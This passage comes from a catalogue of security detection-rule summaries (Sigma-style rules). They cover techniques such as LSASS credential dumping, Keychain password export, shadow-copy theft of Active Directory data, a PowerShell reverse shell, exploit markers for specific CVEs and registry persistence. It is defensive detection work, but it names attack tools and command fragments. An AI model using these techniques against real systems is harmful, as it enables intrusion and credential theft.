    maintaining continued access to the system through scheduled tasks.
  Updated-Date: '2024_09_04'
af491bca-e752-4b44-9c86-df5680533dbc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0b4fd12125d44f6be4f05c1b3a2a7fe5
  Ruleset: core
  Summary: This rule detects the execution of the "finger.exe" utility, which is an
    old tool still present on modern Windows installations. The utility, known as
    the TCPIP Finger Command, is used to display information about users on a specified
    remote computer, usually one running the finger service. Given the antiquity of
    this utility and the rarity of systems running the finger service, any instance
    of "finger.exe" execution is deemed suspicious and merits investigation.
  Updated-Date: '2024_09_03'
af4c4609-5755-42fe-8075-4effb49f5d44:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a13360751d9e2fe0859f4c386ca349f
  Ruleset: sigmahq
  Summary: This rule detects instances where Microsoft Excel loads an Add-In (.xll)
    file from uncommon locations on a Windows system. It monitors specific directories
    such as Desktop, Downloads, Perflogs, Temp, Users\Public, and Windows\Tasks, which
    are not typical places for loading Excel Add-Ins. The detection aims to uncover
    potential malicious activities, as threat actors may use .xll files in these directories
    to execute unauthorized code. Adjustments may be necessary to account for legitimate
    use cases where these locations are considered secure within an organization.
  Updated-Date: '2024_09_04'
af6925b0-8826-47f1-9324-337507a0babd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2d4f5ad42c0cc0c9d4e54891cb273918
  Ruleset: sigmahq
  Summary: This rule detects modifications or deletions of DNS zones in Microsoft
    Azure. It identifies operations related to DNS zones where the operation name
    starts with "MICROSOFT.NETWORK/DNSZONES" and ends with either "/WRITE" or "/DELETE".
    These activities might indicate administrative changes or potential security concerns,
    requiring verification of the user identity and user agent involved. Unfamiliar
    modifications should be investigated, and known false positive behaviors can be
    exempted from this rule.
  Updated-Date: '2024_09_04'
af6c3078-84cd-4c68-8842-08b76bd81b13:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2a7444eedcecb5c1c0426519f963682
  Ruleset: sigmahq
  Summary: This rule detects instances where an HTTP service on an OpenCanary node
    has received a GET request. OpenCanary is a network honeypot tool designed to
    mimic services and capture data on potential security threats. The detection focuses
    on HTTP GET requests logged by OpenCanary, which could indicate an attempt to
    probe or gain initial access to the network. This activity is considered to have
    a high risk level and is unlikely to generate false positives.
  Updated-Date: '2024_09_04'
af77cf95-c469-471c-b6a0-946c685c4798:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 74a929d67b8fd31abfc6065e85796e79
  Ruleset: core
  Summary: This rule detects the misuse of the Windows Update Client binary (wuauclt.exe)
    for proxy execution. It monitors process creation events specifically looking
    for instances where the executable 'wuauclt.exe' is invoked with command-line
    arguments that include 'UpdateDeploymentProvider' and 'RunHandlerComServer'. The
    rule employs several filters to exclude legitimate uses of this binary by filtering
    out command lines that contain specific paths and DLLs associated with expected
    Windows Update operations. This helps in identifying potentially malicious activities
    while reducing false positives. Notably, the Windows Update Client can be leveraged
    by attackers, such as the Lazarus APT group from North Korea, to execute unauthorized
    actions under the guise of legitimate update processes.
  Updated-Date: '2024_09_03'
af8bbce4-f751-46b4-8d91-82a33a736f61:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9e34a5352efd73d1940a4337790b17f0
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2021-41379, also
    known as InstallerFileTakeOver. This vulnerability is a local privilege escalation
    (LPE) issue where an attacker spawns a "cmd.exe" process as a child of the Microsoft
    Edge elevation service, "elevation_service.exe," with "LOCAL_SYSTEM" rights. This
    behavior indicates a potential attempt to gain elevated privileges through exploitation
    of the vulnerability.
  Updated-Date: '2024_09_03'
afd12fed-b0ec-45c9-a13d-aa86625dac81:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 01a26f2dfc408b57177ec79cdc78e2c6
  Ruleset: core
  Summary: This rule detects the usage of PowerShell scripts to create Volume Shadow
    Copies on Windows systems. Adversaries might leverage this technique to access
    or create a copy of the Active Directory domain database, potentially to steal
    credential information. The detection criteria focus on specific script block
    text patterns involving Win32_ShadowCopy, the .Create method, and ClientAccessible.
    While legitimate PowerShell scripts could trigger this detection, the activity
    is generally considered high risk, given its association with credential access
    tactics.
  Updated-Date: '2024_09_03'
afd3df04-948d-46f6-ae44-25966c44b97f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c8e3aaa9febc705219a80ea4b0850dac
  Ruleset: core
  Summary: This rule detects the use of PSAsyncShell, an asynchronous TCP reverse
    shell implemented in PowerShell.
  Updated-Date: '2024_09_03'
afe52666-401e-4a02-b4ff-5d128990b8cb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 380a760f15addbce808e13597c46cca4
  Ruleset: sigmahq
  Summary: This rule detects the usage of the `rar.exe` application to create an archive
    from a potentially suspicious folder on a Windows system. The detection criteria
    focus on specific command line patterns associated with compressing files, including
    the use of archives from system or common staging directories such as `Recycle.bin`,
    `PerfLogs`, `Temp`, `Users\Public`, and `Windows`. The criteria also include the
    use of particular command line flags like archive password protection (`-hp`)
    and recursive folder archiving (`-r`). These behaviors may indicate malicious
    activity, such as data exfiltration or the staging of files for later use by attackers.
  Updated-Date: '2024_09_04'
aff229ab-f8cd-447b-b215-084d11e79eb0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7f7f84678e6a2e61dce1a23a8755490e
  Ruleset: core
  Summary: This rule detects remote RPC calls made to create or execute a scheduled
    task via SASec, specifically focusing on events logged by the RPC Firewall. The
    targeted activity involves the manipulation of scheduled tasks for lateral movement
    purposes, identified through specific interface UUIDs and operation numbers. This
    detection helps mitigate unauthorized remote task scheduling that could indicate
    attempts at spreading malware or persistent threats across systems.
  Updated-Date: '2024_09_03'
aff715fa-4dd5-497a-8db3-910bea555566:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: feea4cb79f66813807f064d61531526f
  Ruleset: core
  Summary: This rule detects suspicious DNS queries to external service interaction
    domains that are commonly utilized for out-of-band interactions following a successful
    Remote Code Execution (RCE). The domains of interest include those using extensions
    like interact.sh, oast.pro, oast.live, and others, which are utilized by attackers
    to facilitate covert communications or retrieve data from a compromised system.
    Notable domains also include burpcollaborator.net, canarytokens.com, requestbin.net,
    and dnslog.cn, each serving as a potential indicator of malicious external service
    interactions.
  Updated-Date: '2024_09_03'
b014ea07-8ea0-4859-b517-50a4e5b7ecec:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fdbdeae900dc3c4456c9f821b3979c2a
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of a file upload vulnerability
    identified as CVE-2021-22005 in VMware vCenter Server. The detection focuses on
    web server log entries where the HTTP method is 'POST' and the query string contains
    '/analytics/telemetry/ph/api/hyper/send?'. This specific activity indicates an
    attempt to exploit the vulnerability, potentially allowing unauthorized code execution
    on the vCenter Server.
  Updated-Date: '2024_09_03'
b02f9591-12c3-4965-986a-88028629b2e1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ad6b267374972f07df422449be5e4276
  Ruleset: sigmahq
  Summary: This rule detects the deletion of Azure Kubernetes Pods, which are essential
    components in a Kubernetes environment. Pod deletions can occur due to administrative
    actions or potentially malicious activities, and therefore, such events warrant
    attention to distinguish legitimate administrative tasks from unauthorized or
    harmful actions.
  Updated-Date: '2024_09_04'
b0422664-37a4-4e78-949a-4a139309eaf0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bdb965bde4a7e9ec995d03356b64cb69
  Ruleset: emerging-threats
  Summary: This rule detects potential command and control (C2) communication related
    to the Small Sieve malware. The detection criteria focus on HTTP GET requests
    to the host "api.telegram.org" with specific URI parameters indicating communication
    with a chat ID and containing the text segment "com/". The context indicates that
    the Small Sieve malware might use this method for C2 activities.
  Updated-Date: '2024_09_03'
b04934b2-0a68-4845-8a19-bdfed3a68a7a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: faad859e5f022c5c28b2dccf14a6d9b4
  Ruleset: sigmahq
  Summary: This rule detects when an application is assigned roles within Azure Active
    Directory (Azure AD) or has Azure Resource-Based Access Control (RBAC) roles granted,
    such as global administrator or subscription owner. This action is typically logged
    in Azure audit logs and could indicate persistence or privilege escalation tactics.
    The detection focuses on specific messages that add members to roles, ensuring
    that only relevant events trigger the alert.
  Updated-Date: '2024_09_04'
b0524451-19af-4efa-a46f-562a977f792e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 27057883ad5fe0a0d80c7b6634ddf65c
  Ruleset: core
  Summary: This rule detects actions that clear the local ShimCache, which is used
    to remove forensic evidence on Windows systems. Specifically, it looks for the
    usage of 'rundll32' in conjunction with 'apphelp.dll' commands such as 'ShimFlushCache'
    and specific function identifiers like '#250', as well as 'rundll32' paired with
    'kernel32.dll' commands including 'BaseFlushAppcompatCache' and function identifiers
    like '#46'. This activity is indicative of an attempt to evade detection by clearing
    application compatibility cache data, a technique often employed in defense evasion
    scenarios.
  Updated-Date: '2024_09_03'
b06335b3-55ac-4b41-937e-16b7f5d57dfd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95e885c0e7d708bdd565307c9cfec3b1
  Ruleset: emerging-threats
  Summary: This rule detects potential successful exploitation of the CVE-2021-26858
    vulnerability in Microsoft Exchange Server. It identifies the creation of non-standard
    files on disk by the Exchange Server's Unified Messaging service, such as web
    shells or other malicious content. The detection relies on monitoring file events
    in Windows, specifically by checking files created by the `UMWorkerProcess.exe`
    process and excluding certain benign file types.
  Updated-Date: '2024_09_03'
b094d9fb-b1ad-4650-9f1a-fb7be9f1d34b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 68d96f739c3ed9965ecbad4fdeadbfcd
  Ruleset: sigmahq
  Summary: This rule detects specific Cisco "show" commands being input into the device,
    which may reveal full credentials in the command history. The monitored commands
    include "show history," "show history all," and "show logging." The usage of these
    commands is generally uncommon among administrators, particularly if remote logging
    is configured.
  Updated-Date: '2024_09_04'
b0ce780f-10bd-496d-9067-066d23dc3aa5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6517eccd71e14c55244bea87664166f5
  Ruleset: sigmahq
  Summary: This rule detects the execution of SharpWSUS or WSUSpendu, tools that facilitate
    lateral movement through Windows Server Update Services (WSUS). WSUS is essential
    for Windows systems and can be exploited by attackers to bypass internal network
    limitations. The rule identifies specific command line patterns associated with
    these utilities, such as injection commands, payload arguments, and various operational
    flags used by SharpWSUS for tasks like approving, creating, checking, and deleting
    updates.
  Updated-Date: '2024_09_04'
b110ebaf-697f-4da1-afd5-b536fa27a2c1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f812ca3d1916030702e1b00c27911f6e
  Ruleset: core
  Summary: This rule detects modifications in the Windows registry that enable developer
    features, such as "Developer Mode" or "Application Sideloading," which allow the
    installation of untrusted packages. Specifically, it monitors changes to registry
    keys related to "AppModelUnlock" and "Appx" policies, focusing on entries that
    end with "\AllowAllTrustedApps" or "\AllowDevelopmentWithoutDevLicense" and are
    set to activate these features. Such modifications can potentially be exploited
    to bypass application signing requirements, thereby posing a security risk.
  Updated-Date: '2024_09_03'
b120b587-a4c2-4b94-875d-99c9807d6955:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 787b07f1955dc86c1dd09f4e129fc231
  Ruleset: sigmahq
  Summary: This rule detects instances of password dumps from the Keychain on macOS
    systems by monitoring specific process creation activities. It looks for particular
    command-line arguments involving the '/usr/bin/security' image, such as 'find-certificate'
    and 'export', as well as 'dump-keychain' and 'login-keychain'. These commands
    are often associated with accessing and exporting Keychain data, which can indicate
    attempts to retrieve stored credentials. The detection may be triggered by legitimate
    administrative activities, but it seeks to identify potential unauthorized access
    to sensitive information stored in Keychain.
  Updated-Date: '2024_09_04'
b124ddf4-778d-418e-907f-6dd3fc0d31cd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2facb6c15c66ef50b807a7022649e6b3
  Ruleset: sigmahq
  Summary: This rule detects the usage of "PresentationHost.exe," a utility used to
    run ".xbap" (Browser Applications) files, to download arbitrary files via specified
    URLs. It identifies processes where the image is PresentationHost.exe and the
    command line contains URLs starting with "http://," "https://," or "ftp://," indicating
    potential misuse of the application for file download tasks.
  Updated-Date: '2024_09_04'
b1377339-fda6-477a-b455-ac0923f9ec2c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4653632f14ebc00b8a6aabbb744d65ff
  Ruleset: sigmahq
  Summary: This rule detects the activity of piping a password to an AnyDesk instance
    via command line interface (CLI) using the '--set-password' flag on a Windows
    system. This behavior is indicative of a remote access tool (RAT) configuration
    where the password is being set programmatically, potentially signaling unauthorized
    remote control preparations. The detection tracks specific command line patterns
    that include commands like 'echo' and any executable with the '--set-password'
    parameter. Possible false positives may arise from legitimate administrative actions
    or other tools using a similar command line structure.
  Updated-Date: '2024_09_04'
b140afd9-474b-4072-958e-2ebb435abd68:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 68848cb3b2de8bd728f776b5075976e9
  Ruleset: core
  Summary: This rule detects the suspicious usage of the PowerShell Get-ADDBAccount
    script, which interacts with the ntds.dit file to potentially access credentials
    bypassing traditional credential dumping tools. The script reads sensitive data
    directly, posing a significant security risk when invoked under suspicious circumstances.
  Updated-Date: '2024_09_03'
b17ea6f7-6e90-447e-a799-e6c0a493d6ce:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8e54f5c611fb7122de8e287bc82a8089
  Ruleset: sigmahq
  Summary: This rule detects the creation of shadow copies using operating system
    utilities, which could indicate possible credential access attempts. The detection
    focuses on the execution of specific utilities such as PowerShell, WMIC, and VSSAdmin,
    looking for command lines that include keywords related to shadow copy creation.
    While legitimate uses of these utilities by administrators for backup purposes
    can generate false positives, such actions are typically scrutinized to ensure
    they are authorized activities within the environment.
  Updated-Date: '2024_09_04'
b18454c8-0be3-41f7-86bc-9c614611b839:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7847f02db0e51ed77ae050f3f9e403a0
  Ruleset: sigmahq
  Summary: This rule detects changes made to the "StrongAuthenticationRequirement"
    value in Azure audit logs, specifically when the state is set to "0" or "Disabled."
    This activity may indicate that multi-factor authentication (MFA) has been disabled
    for a user account, which threat actors can exploit to maintain or gain access
    to the account. This tactic is also commonly observed in SIM swap attacks.
  Updated-Date: '2024_09_04'
b1876533-4ed5-4a83-90f3-b8645840a413:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 017c88ce6905dd32671d411f13ccf224
  Ruleset: core
  Summary: This rule detects the execution of the hacktool SafetyKatz on Windows systems.
    SafetyKatz is used for credential dumping, leveraging techniques that align with
    credential access and specifically targeting LSASS memory to extract passwords
    and other sensitive information. The detection is based on the presence of specific
    file characteristics such as the image name, original file name, and description
    ending with or matching 'SafetyKatz.exe'.
  Updated-Date: '2024_09_03'
b18c9d4c-fac9-4708-bd06-dd5bfacf200f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9e33020faa7bbbba0ff6aed8da6a2d69
  Ruleset: core
  Summary: This rule detects the execution of F-Secure C3's NodeRelay DLL using the
    `rundll32.exe` utility on Windows systems. The primary indicator is the presence
    of specific command line arguments that include 'rundll32.exe', a '.dll' file,
    and the 'StartNodeRelay' function. The F-Secure C3 tool is employed for conducting
    penetration tests and red team operations, and this particular behavior may suggest
    an attempt to evade defenses by executing the NodeRelay function from a dynamically
    linked library (DLL).
  Updated-Date: '2024_09_03'
b19146a3-25d4-41b4-928b-1e2a92641b1b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6effe1d8805e8959a741b37f64f0d478
  Ruleset: sigmahq
  Summary: This rule detects potential web shell execution initiated from the ScreenConnect
    server process on Windows systems. It specifically monitors the creation of new
    processes where the parent process is `ScreenConnect.Service.exe` and the new
    processes are command-line tools such as `cmd.exe` or the C# compiler (`csc.exe`).
    This activity could indicate an attempt to gain unauthorized access via the ScreenConnect
    platform, which is often used for remote access and control.
  Updated-Date: '2024_09_04'
b1bc08d1-8224-4758-a0e6-fbcfc98c73bb:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0d6733a94793c9066a24d56416ce5751
  Ruleset: core
  Summary: This rule detects instances where privileged role assignments occur outside
    of Privileged Identity Management (PIM), which may signify a potential attack.
    Privileged Identity Management is a feature in Microsoft Azure that enables organizations
    to manage, control, and monitor access to important resources. The alert is triggered
    based on a specific risk event type, suggesting that the roles were assigned without
    adhering to the controlled guidelines of PIM, thus potentially leading to unauthorized
    privilege escalation.
  Updated-Date: '2024_09_03'
b1bd3a59-c1fd-4860-9f40-4dd161a7d1f5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 07680754203444f70a5a3542bed7c246
  Ruleset: core
  Summary: This rule detects the activity of HandleKatz accessing the Local Security
    Authority Subsystem Service (LSASS) to duplicate its handle, which can be used
    to dump memory without creating new handles. HandleKatz is a tool that exploits
    this technique to perform memory dumps for potentially malicious purposes. The
    detection focuses on specific process access patterns, particularly targeting
    `lsass.exe` with granted access rights and call traces indicating the use of system
    DLLs.
  Updated-Date: '2024_09_03'
b1c50487-1967-4315-a026-6491686d860e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ae143c91a0978c65df4d6182ffdc4bb3
  Ruleset: core
  Summary: This rule detects the creation of an Office macro file originating from
    a suspicious process on a Windows system. The rule monitors for processes such
    as `cscript.exe`, `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, and `wscript.exe`
    that are often leveraged in malicious activities to create macro-enabled Office
    files with extensions like `.docm`, `.dotm`, `.xlsm`, `.xltm`, `.potm`, and `.pptm`.
    This detection helps identify potentially harmful operations linked to initial
    access tactics used in cyber attacks.
  Updated-Date: '2024_09_03'
b1cb4ab6-ac31-43f4-adf1-d9d08957419c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f937a2944a0704fc839f42ad042a4f85
  Ruleset: sigmahq
  Summary: This rule detects the execution of PingCastle, a tool designed to quickly
    assess the security level of Active Directory environments. It identifies instances
    of PingCastle.exe based on specific hash values, file names, product names, and
    command-line arguments associated with its various scanning operations, such as
    ACL checks, antivirus scans, and health assessments.
  Updated-Date: '2024_09_04'
b1e5da3b-ca8e-4adf-915c-9921f3d85481:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 471744dd21c252aace78e2509c419324
  Ruleset: core
  Summary: This rule detects instances where the svchost process, specifically hosting
    the RDP (Remote Desktop Protocol) service termsvcs, is initiating connections
    to target systems on TCP ports 80 (HTTP) or 443 (HTTPS). This behavior could indicate
    an attempt to bypass network restrictions via RDP tunneling, potentially related
    to command-and-control or lateral movement activities. The detection criteria
    include the use of svchost.exe, initiation flag set to true, source port 3389,
    and destination ports 80 or 443.
  Updated-Date: '2024_09_03'
b1ec66c6-f4d1-4b5c-96dd-af28ccae7727:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7fdfe0e637e8410e2d9b64b7e453cdfd
  Ruleset: sigmahq
  Summary: This rule detects the usage of "cmdkey.exe" to add generic credentials
    on Windows systems. This command-line tool can be employed prior to connecting
    to a Remote Desktop Protocol (RDP) session, facilitating credential management
    by allowing the user to cache login information. The rule identifies the execution
    of "cmdkey.exe" by monitoring for specific command-line arguments that denote
    the addition of generic credentials, user information, and passwords. While there
    may be legitimate administrative uses for this activity, it is flagged for its
    potential relevance to credential access and misuse.
  Updated-Date: '2024_09_04'
b210394c-ba12-4f89-9117-44a2464b9511:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 71cb1f340a869b04523c409ba914c1cd
  Ruleset: core
  Summary: This rule detects non-system accounts accessing and creating files with
    write permissions via the administrative share, specifically the 'C$' share, on
    a Windows system. It monitors for Event ID 5145 in the security logs, where the
    access mask has a value of '0x2', indicating write access. The rule excludes activities
    performed by system accounts, which typically end with a '$' character in the
    username, to reduce the likelihood of false positives. This type of activity may
    indicate lateral movement or unauthorized file modifications by potentially malicious
    actors.
  Updated-Date: '2024_09_03'
b222df08-0e07-11eb-adc1-0242ac120002:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0871a0f9ebfc9685376d7b8618f2f1fd
  Ruleset: core
  Summary: This rule detects the use of obfuscated command lines involving Clip.exe
    to execute PowerShell commands on Windows systems. It specifically looks for patterns
    where cmd.exe is used to run commands that interact with the clipboard, likely
    as a means to obfuscate PowerShell execution. Key indicators in the command line
    include the presence of 'cmd', '&&', 'clipboard]::', and '-f', indicating the
    use of complex, likely obfuscated scripts.
  Updated-Date: '2024_09_03'
b22a5b36-2431-493a-8be1-0bae56c28ef3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7ec9d3379825f06aa56d362674c65808
  Ruleset: sigmahq
  Summary: This rule detects the creation of a hidden user account on macOS. It specifically
    monitors for accounts with a UserID below 500 or those configured with the 'IsHidden'
    option. The rule looks for process creation events where the 'dscl' command is
    used to create a user and checks if the command line contains a UniqueID within
    the range of 1 to 499 or if it includes the 'IsHidden' option set to true, yes,
    or 1. This monitoring aims to identify potential defense evasion tactics by malicious
    actors.
  Updated-Date: '2024_09_04'
b2309017-4235-44fe-b5af-b15363011957:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3e284aec7a6a47c340aaaec4e38bba96
  Ruleset: sigmahq
  Summary: This rule detects uncommon child processes initiated by the "DefaultPack.EXE"
    binary. DefaultPack.EXE is a legitimate Microsoft binary that can be exploited
    by attackers to launch other processes as a means to bypass security controls
    or execute malicious code. This activity falls under techniques for defense evasion
    and execution, making it significant for identifying potential misuse or malicious
    behavior in Windows environments.
  Updated-Date: '2024_09_04'
b2317cfa-4a47-4ead-b3ff-297438c0bc2d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ff3234c37c2cd522b5cac8cfcd50b58c
  Ruleset: core
  Summary: This rule detects the execution of SharpView, an offensive security tool
    derived from PowerView, designed for network and system discovery. SharpView allows
    adversaries to gather information about domain environments through various commands.
    These commands help in identifying active directory details, users, groups, policies,
    sessions, network shares, and more. The rule specifically looks at the execution
    of the SharpView executable and command lines containing terms related to network
    and system discovery functions such as 'Add-RemoteConnection,' 'ConvertFrom-SID,'
    'Find-DomainUserEvent,' 'Get-DomainFileServer,' and 'Invoke-Sharefinder.' This
    indicates potential reconnaissance activities typically performed during initial
    stages of a cyberattack.
  Updated-Date: '2024_09_03'
b236190c-1c61-41e9-84b3-3fe03f6d76b0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5ed525cf74a85e1844e9d77c6697ab32
  Ruleset: sigmahq
  Summary: This rule detects a potential anomaly in the use of the "regsvr32" command
    where the "/i" flag is used without the "/n" flag. The unusual usage pattern of
    these flags could indicate malicious activity or misuse. The detection is specific
    to instances where "regsvr32.exe" is executed with the "-i" option in the command
    line, but the "-n" option is absent, which is uncommon and potentially indicative
    of an attempt to evade defenses. This rule helps to identify suspicious command
    lines that may warrant further investigation.
  Updated-Date: '2024_09_04'
b23818c7-e575-4d13-8012-332075ec0a2b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a966bef7ae0b7889e596b30cae183a2e
  Ruleset: sigmahq
  Summary: This rule detects when an attacker registers a new IFilter for an extension
    in Microsoft Windows. Windows Search uses filters to extract content from items
    for indexing in a full-text index. By writing custom filters, it's possible to
    index new or proprietary file types. This activity is significant as it could
    indicate an attempt to persist through the registration of these filters. The
    rule identifies pertinent registry entries and class identifiers (CLSIDs) associated
    with such activities, while also considering potential blind spots where attackers
    might hijack existing persistent handlers.
  Updated-Date: '2024_09_04'
b2400ffb-7680-47c0-b08a-098a7de7e7a9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dac71f308ed697267ba4f81193dd8df9
  Ruleset: emerging-threats
  Summary: This rule detects the use of the Pingback backdoor, which creates an ICMP
    tunnel for command and control (C2) purposes. The rule identifies specific patterns
    in process creation on Windows systems, looking for certain command line configurations
    involving the execution of 'updata.exe' with commands related to 'config', 'msdtc',
    'start', and 'auto'. These detections are aligned with behaviors described in
    a Trustwave report detailing the malicious activities of the Pingback backdoor
    via ICMP tunnels.
  Updated-Date: '2024_09_03'
b2572bf9-e20a-4594-b528-40bde666525a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ffed4ef5f203bd66dc77445e70f2d111
  Ruleset: core
  Summary: This rule detects user activities originating from geographically distant
    locations within a time frame shorter than it takes to travel between these locations,
    signaling potentially suspicious behavior indicative of compromised credentials
    or malicious activity.
  Updated-Date: '2024_09_03'
b27077d6-23e6-45d2-81a0-e2b356eea5fd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc6a96c2673cc950faa15baaa8c18173
  Ruleset: sigmahq
  Summary: This rule detects the execution of TTDInject.exe, which is utilized by
    Windows 10 version 1809 and newer for time travel debugging, invoking the tttracer.exe
    process.
  Updated-Date: '2024_09_04'
b2815d0d-7481-4bf0-9b6c-a4c48a94b349:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3be79f22aaaf9d9538a05cab5ee86f9c
  Ruleset: core
  Summary: This rule detects the use of the PowerShell "Get-Process" cmdlet and its
    aliases targeting the lsass process. The act of querying lsass in this manner
    is typically indicative of malicious activity, often related to attempts at credential
    theft or unauthorized access.
  Updated-Date: '2024_09_03'
b28e4eb3-8bbc-4f0c-819f-edfe8e2f25db:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 563167a0d6d1408d386ce3ea667e6135
  Ruleset: sigmahq
  Summary: This rule detects user account creation on an ESXi system through the esxcli
    command-line tool. It identifies processes ending with '/esxcli' that contain
    command parameters indicating the addition of a system account. This can be used
    to monitor and identify potentially unauthorized account creation on ESXi hosts.
    Legitimate administration activities could be considered false positives.
  Updated-Date: '2024_09_04'
b28e58e4-2a72-4fae-bdee-0fbe904db642:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 89c737ef002fe84883003ccd0b383d38
  Ruleset: core
  Summary: This rule detects when Windows Defender Real-time Protection is disabled.
    This is identified using EventID 5001, which signifies that Real-time Protection
    in Windows Defender has been turned off. Disabling real-time protection can be
    a part of defense evasion techniques often used by malicious actors to bypass
    security measures, and therefore warrants investigation. However, it may also
    occur due to legitimate administrator actions or occasionally during Defender
    updates in Windows 8 environments.
  Updated-Date: '2024_09_03'
b29a93fb-087c-4b5b-a84d-ee3309e69d08:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f253f5756e191d78afc14b91e45ec4b4
  Ruleset: sigmahq
  Summary: This rule detects the manipulation of user, computer, or group security
    principals across Active Directory. It specifically targets the creation of domain
    accounts by adversaries to maintain access to victim systems. The rule identifies
    the use of System.DirectoryServices.AccountManagement within PowerShell script
    blocks, which is indicative of such activities. This action is often related to
    persistence techniques used in attacks. Enabling Script Block Logging is necessary
    for this detection. While some activities might be legitimate administrative scripts,
    they are flagged due to their potential use in creating unauthorized domain accounts.
  Updated-Date: '2024_09_04'
b29aed60-ebd1-442b-9cb5-16a1d0324adb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c138b9fee14c5f4de365f43975f0c7e3
  Ruleset: sigmahq
  Summary: This rule detects modifications to autostart extensibility points (ASEP)
    in the Windows registry, specifically within the Wow6432Node CurrentVersion path.
    It looks for changes to registry keys associated with various autorun locations
    used by software to automatically execute upon system startup. Such keys include,
    but are not limited to, \Run\, \RunOnce\, \RunServices\, and several others under
    the \Explorer\ path. The rule incorporates a variety of filters to reduce false
    positives by excluding legitimate software operations such as Microsoft Edge updates,
    Microsoft Office components, Dropbox, Evernote, .NET runtime, and various uninstallation
    processes. The aim is to identify unauthorized or malicious persistence mechanisms
    that leverage these registry paths to gain execution at startup.
  Updated-Date: '2024_09_04'
b2b048b0-7857-4380-b0fb-d3f0ab820b71:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8e813c8572f7a172fd4efeeaefdcc869
  Ruleset: sigmahq
  Summary: This rule detects the use of iexpress.exe to create binaries via Self Extraction
    Directive (SED) files from potentially suspicious locations. IExpress is a tool
    used to create self-extracting packages, and threat actors have been observed
